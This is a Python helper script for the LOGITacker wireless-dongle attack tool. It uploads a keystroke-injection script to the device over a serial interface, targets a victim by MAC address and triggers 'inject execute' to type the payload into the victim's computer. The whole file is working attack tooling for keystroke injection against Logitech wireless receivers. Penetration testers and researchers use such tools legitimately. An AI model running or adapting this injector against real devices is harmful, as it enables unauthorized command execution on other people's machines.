# -*- coding: utf-8 -*-
from __future__ import print_function
from libs.LGTCommands import *
import time
import argparse

#
# Script injection helper by @FlUxIuS
#

class ScripInject(object):
    scriptpath = None
    devtty = None

    def __init__(self, tty):
        """
            in(1): String device tty path
        """
        self.cmdhandler = LGTCommands(tty)

    def __cleanscript(self):
        """
            Cleaning script in flash
        """
        self.cmdhandler.executeCommand("script clear")

    def uploadscript(self, scriptpath):
        """
            Uploading a script to memory
            in(1): String path of the script to upload
        """
        self.__cleanscript()
        f = open(scriptpath, "r")
        for line in f.readlines():
            self.cmdhandler.executeCommand(line)
        f.close()

    def inject(self, targetmac):
        """
            Calling injection commands
            in(2): String MAC address of the target
        """
        self.cmdhandler.executeCommand("inject target "+targetmac)
        time.sleep(5)
        self.cmdhandler.executeCommand("inject execute")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Injection script tool for LOGITacker")
    parser.add_argument("-s", "--script", dest="scriptpath", required=True,
                                    help="script path to upload in memory")
    parser.add_argument("-i", "--interface", dest="interface", required=True,
                                    help="TTY interface spawn by LOGITacker")
    parser.add_argument("-t", "--target", dest="target", required=False, default=None,
                                    help="target's MAC address")
    args = parser.parse_args()
    sc = ScripInject(args.interface)
    sc.uploadscript(args.scriptpath)
    print ("[+] Uploaded script:")
    print (sc.cmdhandler.executeCommand("script show", output=True, tfrom="script start", tto="script end"))
    if args.target is not None:
        print("[+] Injecting payload to %s" % args.target)
        sc.inject(args.target)
